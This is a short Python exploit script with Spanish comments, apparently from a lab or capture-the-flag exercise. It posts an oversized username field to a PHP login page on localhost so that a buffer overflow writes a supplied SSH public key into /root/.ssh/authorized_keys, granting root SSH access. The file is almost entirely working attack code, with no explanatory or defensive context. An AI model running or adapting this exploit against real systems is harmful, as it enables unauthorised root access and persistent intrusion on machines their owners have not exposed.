import requests
from argparse import ArgumentParser
def exploit(key):
    buf = "A" * 16
    buf += '/root/.ssh/authorized_keys' + "\n" # en este archivo se guarda la clave publica id_rsa --> registro rdi
    buf += "B" * (128 - len(buf))
    buf += "\n" + key + "\n" # corresponde al registro rsi
    buf += "C" * (65535 - len(buf))
    url = 'http://127.0.0.1:9999/index.php'
    data = {
        'username': buf,
        'password': 'password'
    }
    response = requests.post(url, data=data)

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-k", "--key", help="contenido de la clave publica ssh",required=True)
    args = parser.parse_args()
    exploit(args.key)
